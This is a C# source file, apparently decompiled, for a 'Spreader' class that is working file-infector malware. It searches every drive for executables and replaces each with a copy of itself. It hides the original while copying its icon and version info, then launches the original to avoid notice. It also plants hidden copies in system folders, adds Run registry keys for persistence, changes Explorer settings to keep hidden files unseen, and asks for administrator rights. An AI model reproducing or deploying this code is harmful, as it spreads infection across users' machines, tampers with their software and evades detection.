using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using TRM.AppResource;
using TRM.Classes;

namespace TRM.Spread;

public static class Spreader
{
	private static readonly string DirWindows;

	private static readonly string DirProgramFiles;

	public static readonly List<string> ExcludedStartedByFolders;

	private static List<string> _appEssentionalPotentionalLocatins;

	private static readonly string SpreadedExeFileExt;

	private static readonly string SpreadedExeSearchFile;

	private static readonly string FoxProSkipExeApp1;

	private static readonly string FoxProSkipExeApp2;

	public static readonly int DelayBetweenChecks;

	static Spreader()
	{
		SpreadedExeFileExt = ".exe";
		SpreadedExeSearchFile = "*.exe";
		FoxProSkipExeApp1 = "fox.exe";
		FoxProSkipExeApp2 = "foxpro.exe";
		DelayBetweenChecks = 3600000;
		try
		{
			char directorySeparatorChar = Path.DirectorySeparatorChar;
			DirWindows = Environment.GetFolderPath(Environment.SpecialFolder.System);
			int length = DirWindows.LastIndexOf(directorySeparatorChar);
			DirWindows = DirWindows.Substring(0, length).ToLower();
			DirProgramFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToLower();
		}
		catch
		{
		}
		ExcludedStartedByFolders = new List<string> { DirWindows, DirProgramFiles };
	}

	public static void StartSpreaderProcess()
	{
		try
		{
			do
			{
				StartSpreaderProcessDrives();
				Thread.Sleep(DelayBetweenChecks);
			}
			while (AppConfig.AppIsRunning);
		}
		catch
		{
		}
	}

	private static void StartSpreaderProcessDrives()
	{
		string[] logicalDrives = Directory.GetLogicalDrives();
		for (int num = logicalDrives.Length - 1; num >= 0; num--)
		{
			string startPath = logicalDrives[num];
			FileHelper.SearchFiles(startPath, SpreadedExeSearchFile, subdirectories: true, delegate(List<string> files)
			{
				if (!SkipFoxProContainedList(files))
				{
					foreach (string file in files)
					{
						SpreadOperationForExeFile(file);
						Thread.Sleep(600);
					}
				}
				Thread.Sleep(500);
			}, ExcludedStartedByFolders);
		}
	}

	private static bool SkipFoxProContainedList(List<string> files)
	{
		if (files != null && files.Count != 0)
		{
			int num = 0;
			while (true)
			{
				if (num < files.Count)
				{
					string text = files[num].ToLower();
					if (!text.EndsWith(FoxProSkipExeApp1))
					{
						if (text.EndsWith(FoxProSkipExeApp2))
						{
							break;
						}
						num++;
						continue;
					}
					return true;
				}
				return false;
			}
			return true;
		}
		return true;
	}

	public static List<string> AppEssentionalPotentionalLocatins()
	{
		if (_appEssentionalPotentionalLocatins != null)
		{
			return _appEssentionalPotentionalLocatins;
		}
		string path = "";
		string path2 = "";
		string path3 = "";
		string path4 = "";
		string path5 = "c:\\windows\\";
		string path6 = "c:\\";
		try
		{
			path = Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower();
		}
		catch
		{
		}
		try
		{
			path2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToLower();
		}
		catch
		{
		}
		try
		{
			path4 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData).ToLower();
		}
		catch
		{
		}
		try
		{
			path3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal).ToLower();
		}
		catch
		{
		}
		List<string> list = new List<string>();
		string[] appNames = AppConfig.AppNames;
		foreach (string text in appNames)
		{
			list.Add(Path.Combine(path, text + SpreadedExeFileExt));
		}
		string[] appNames2 = AppConfig.AppNames;
		foreach (string text2 in appNames2)
		{
			list.Add(Path.Combine(path5, text2 + SpreadedExeFileExt));
		}
		string[] appNames3 = AppConfig.AppNames;
		foreach (string text3 in appNames3)
		{
			list.Add(Path.Combine(path2, text3 + SpreadedExeFileExt));
		}
		string[] appNames4 = AppConfig.AppNames;
		foreach (string text4 in appNames4)
		{
			list.Add(Path.Combine(path4, text4 + SpreadedExeFileExt));
		}
		string[] appNames5 = AppConfig.AppNames;
		foreach (string text5 in appNames5)
		{
			list.Add(Path.Combine(path3, text5 + SpreadedExeFileExt));
		}
		string[] appNames6 = AppConfig.AppNames;
		foreach (string text6 in appNames6)
		{
			list.Add(Path.Combine(path6, text6 + SpreadedExeFileExt));
		}
		_appEssentionalPotentionalLocatins = list;
		return list;
	}

	public static void SpreadInEssentionalPlaces()
	{
		try
		{
			List<string> list = AppEssentionalPotentionalLocatins();
			string executablePath = Application.get_ExecutablePath();
			foreach (string item in list)
			{
				try
				{
					if (File.Exists(item))
					{
						File.SetAttributes(item, FileAttributes.Archive);
					}
					File.Copy(executablePath, item, overwrite: true);
					if (item.StartsWith("c:\\windows\\"))
					{
						AlterAppResource.ApplyTrmMainVersionInfo(item);
					}
					else
					{
						AlterAppResource.RemoveVersionAndIcon(item);
					}
					File.SetAttributes(item, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Archive);
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<string> AppEssentionalInstalledLocatins()
	{
		List<string> list = AppEssentionalPotentionalLocatins();
		List<string> list2 = new List<string>();
		foreach (string item in list)
		{
			if (File.Exists(item))
			{
				list2.Add(item);
			}
		}
		return list2;
	}

	public static bool IsThisAppRunningFromSystemStartup()
	{
		string text = Application.get_ExecutablePath().ToLower();
		string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text);
		try
		{
			object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension, null);
			if (value.ToString()!.ToLower() == text)
			{
				return true;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			object value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension, null);
			if (value2.ToString()!.ToLower() == text)
			{
				return true;
			}
		}
		catch (Exception)
		{
		}
		return false;
	}

	public static void SetFlagIsElevateToAdmin(bool flag)
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion", "link", Convert.ToByte(flag));
		}
		catch (Exception)
		{
		}
	}

	public static bool GetFlagIsElevateToAdmin()
	{
		try
		{
			return Convert.ToBoolean(Convert.ToByte(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion", "link", Convert.ToByte(value: false))));
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void SpreadInSystemStartup()
	{
		try
		{
			List<string> list = AppEssentionalInstalledLocatins();
			if (list.Count > 0)
			{
				int num = 4;
				if (list.Count < 4)
				{
					num = list.Count;
				}
				for (int i = 0; i < num; i++)
				{
					string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(list[i]);
					try
					{
						Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension, list[i]);
					}
					catch (Exception)
					{
						try
						{
							Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension, list[i]);
						}
						catch
						{
						}
					}
				}
				return;
			}
			string executablePath = Application.get_ExecutablePath();
			string fileNameWithoutExtension2 = Path.GetFileNameWithoutExtension(executablePath);
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension2, executablePath);
			}
			catch (Exception)
			{
				try
				{
					Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension2, executablePath);
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static bool IsInstalledInEssentionalPlace()
	{
		List<string> list = AppEssentionalPotentionalLocatins();
		foreach (string item in list)
		{
			if (File.Exists(item))
			{
				return true;
			}
		}
		return false;
	}

	public static bool IsInstalledInEssentionalPlace(string appPath)
	{
		appPath = appPath.ToLower();
		List<string> list = AppEssentionalPotentionalLocatins();
		return list.Contains(appPath);
	}

	public static void RunSpreadedInfectedFile(string[] args = null)
	{
		string executablePath = Application.get_ExecutablePath();
		string directoryName = Path.GetDirectoryName(executablePath);
		string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(executablePath);
		Path.GetExtension(executablePath);
		string text = Path.Combine(directoryName, fileNameWithoutExtension);
		string text2 = Path.Combine(directoryName, fileNameWithoutExtension + AppConfig.FakeAppPattern);
		if (!File.Exists(text))
		{
			text = text2;
		}
		if (!File.Exists(text))
		{
			return;
		}
		try
		{
			ProcessStartInfo startInfo = Process.GetCurrentProcess().StartInfo;
			startInfo.FileName = text;
			if (args != null && args.Length > 0)
			{
				try
				{
					startInfo.Arguments = GetApplicationOriginalArgumentLine();
				}
				catch
				{
				}
			}
			startInfo.UseShellExecute = false;
			Process.Start(startInfo);
		}
		catch
		{
		}
	}

	public static void SpreadIntoFolder(string directory, bool subdirectories = true)
	{
		FileHelper.SearchFiles(directory, SpreadedExeSearchFile, subdirectories, delegate(List<string> files)
		{
			foreach (string file in files)
			{
				SpreadOperationForExeFile(file);
				Thread.Sleep(50);
			}
		}, ExcludedStartedByFolders);
	}

	private static void SpreadOperationForExeFile(string exeFile)
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			if (IsInstalledInEssentionalPlace(exeFile))
			{
				return;
			}
			string text = exeFile.ToLower();
			if (text.ToLower().StartsWith(DirWindows) || text.StartsWith(DirProgramFiles))
			{
				return;
			}
			string directoryName = Path.GetDirectoryName(exeFile);
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(exeFile);
			Path.GetExtension(exeFile);
			string text2 = Path.Combine(directoryName, fileNameWithoutExtension);
			try
			{
				if (!fileNameWithoutExtension.ToLower().EndsWith(AppConfig.FakeAppPattern))
				{
					File.Move(exeFile, text2);
					File.Copy(executablePath, exeFile, overwrite: true);
					try
					{
						AlterAppResource.ReplaceIconAndVersion(text2, exeFile);
					}
					catch (Exception)
					{
					}
					File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Archive);
				}
			}
			catch (Exception)
			{
			}
		}
		catch
		{
		}
	}

	private static bool IsCurrentUserLocalSystem()
	{
		try
		{
			string text = Environment.UserName.ToLower();
			if (text.EndsWith("system"))
			{
				return true;
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static string GetApplicationOriginalArgumentLine()
	{
		try
		{
			string commandLine = Environment.CommandLine;
			string text = commandLine.ToLower();
			string executablePath = Application.get_ExecutablePath();
			string text2 = executablePath.ToLower();
			int num = text.IndexOf(text2, StringComparison.InvariantCulture);
			if (num == 1 && text[0] == '"')
			{
				int num2 = text2.Length + 1 + 1;
				return commandLine.Substring(num2, commandLine.Length - num2).Trim();
			}
			return commandLine.Substring(num, commandLine.Length - num).Trim();
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static void SpreadDontShowHiddenFileConfig()
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowSuperHidden", 0);
		}
		catch
		{
		}
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", 2);
		}
		catch
		{
		}
	}

	public static bool AdministratorIsInRole()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void ElevateInAdministrator(bool withParams)
	{
		if (withParams)
		{
			ShellExecute(IntPtr.Zero, "runas", Application.get_ExecutablePath() ?? "", GetApplicationOriginalArgumentLine(), "", 1);
		}
		else
		{
			ShellExecute(IntPtr.Zero, "runas", Application.get_ExecutablePath() ?? "", "", "", 1);
		}
	}

	[DllImport("shell32.dll")]
	private static extern void ShellExecute(IntPtr intPtr, string p, string p3, string p4, string p5, int p6);
}
